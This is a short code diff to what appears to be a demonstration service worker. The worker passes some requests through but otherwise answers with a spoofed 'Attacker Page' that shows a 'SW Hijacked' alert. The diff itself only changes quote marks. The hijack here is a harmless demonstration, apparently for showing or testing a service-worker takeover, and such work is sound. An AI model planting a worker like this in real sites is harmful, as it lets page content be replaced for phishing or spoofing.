@@ -4,6 +4,6 @@ self.getResponse = async function(url){
     response = await fetch(url)
     return response
   }
-  response = new Response('<html><head>alert('SW Hijacked!!!')</head><body><h1>Attacker Page!!!</h1></body></html>');
+  response = new Response('<html><head>alert("SW Hijacked!!!")</head><body><h1>Attacker Page!!!</h1></body></html>');
   return response
 }
